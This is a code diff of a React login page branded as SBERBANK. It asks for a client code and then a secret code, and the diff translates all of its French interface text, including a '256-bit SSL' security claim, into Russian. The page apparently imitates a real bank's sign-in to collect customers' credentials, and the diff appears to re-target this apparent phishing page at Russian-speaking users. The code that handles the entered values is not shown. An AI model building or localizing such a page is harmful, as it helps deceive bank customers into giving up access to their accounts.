@@ -5,7 +5,7 @@ import { Eye, EyeOff, Lock, Check } from "lucide-react";
 
 export default function LoginPage({ navigate }) {
   const { login } = useAuth();
-  const [step, setStep] = useState("code"); // "code" | "password"
+  const [step, setStep] = useState("code");
   const [code, setCode] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -16,7 +16,7 @@ export default function LoginPage({ navigate }) {
     e.preventDefault();
     setError("");
     if (code.length < 6) {
-      setError("Le code client doit contenir au moins 6 chiffres");
+      setError("Код клиента должен содержать не менее 6 цифр");
       return;
     }
     setLoading(true);
@@ -44,28 +44,26 @@ export default function LoginPage({ navigate }) {
   return (
     <div className="min-h-screen bg-white flex flex-col">
 
-      {/* Header */}
       <div className="bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-center gap-3">
         <img src="images/L2.jpeg" alt="SBERBANK" className="h-12 w-auto object-contain" />
         <span className="text-2xl font-bold text-red-600">SBERBANK</span>
       </div>
 
-      {/* Contenu */}
       <div className="flex-1 flex flex-col justify-center px-6 py-10 max-w-md mx-auto w-full">
         <h1 className="text-2xl font-bold text-gray-900 mb-2">
-          {step === "code" ? "Connexion" : "Code secret"}
+          {step === "code" ? "Вход в систему" : "Секретный код"}
         </h1>
         <p className="text-gray-500 text-sm mb-8">
           {step === "code"
-            ? "Saisissez votre code client"
-            : "Saisissez votre code secret"}
+            ? "Введите ваш код клиента"
+            : "Введите ваш секретный код"}
         </p>
 
         {step === "code" ? (
           <form onSubmit={handleCodeSubmit} className="space-y-6">
             <div>
               <label className="block text-sm font-semibold text-gray-700 mb-2">
-                Code client
+                Код клиента
               </label>
               <div className="relative">
                 <input
@@ -89,14 +87,14 @@ export default function LoginPage({ navigate }) {
               disabled={loading || code.length < 6}
               className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-full transition disabled:opacity-50 disabled:cursor-not-allowed"
             >
-              {loading ? "Vérification..." : "Continuer"}
+              {loading ? "Проверка..." : "Продолжить"}
             </button>
           </form>
         ) : (
           <form onSubmit={handlePasswordSubmit} className="space-y-6">
             <div>
               <label className="block text-sm font-semibold text-gray-700 mb-2">
-                Code secret
+                Секретный код
               </label>
               <div className="relative">
                 <input
@@ -125,14 +123,14 @@ export default function LoginPage({ navigate }) {
                 onClick={() => { setStep("code"); setError(""); setPassword(""); }}
                 className="flex-1 border-2 border-gray-300 text-gray-700 font-semibold py-3 rounded-full hover:bg-gray-50 transition"
               >
-                Retour
+                Назад
               </button>
               <button
                 type="submit"
                 disabled={loading || password.length < 4}
                 className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-full transition disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                {loading ? "Connexion..." : "Se connecter"}
+                {loading ? "Вход..." : "Войти"}
               </button>
             </div>
           </form>
@@ -141,14 +139,13 @@ export default function LoginPage({ navigate }) {
         <div className="mt-10 text-center">
           <div className="flex items-center justify-center gap-2 text-gray-500 text-xs">
             <Lock size={14} />
-            <span>Connexion sécurisée SSL 256 bits</span>
+            <span>Защищённое соединение SSL 256 бит</span>
           </div>
         </div>
       </div>
 
-      {/* Footer */}
       <div className="text-center py-4 text-xs text-gray-400 border-t">
-        © 2026 SBERBANK – Tous droits réservés
+        © 2026 SBERBANK – Все права защищены
       </div>
     </div>
   );
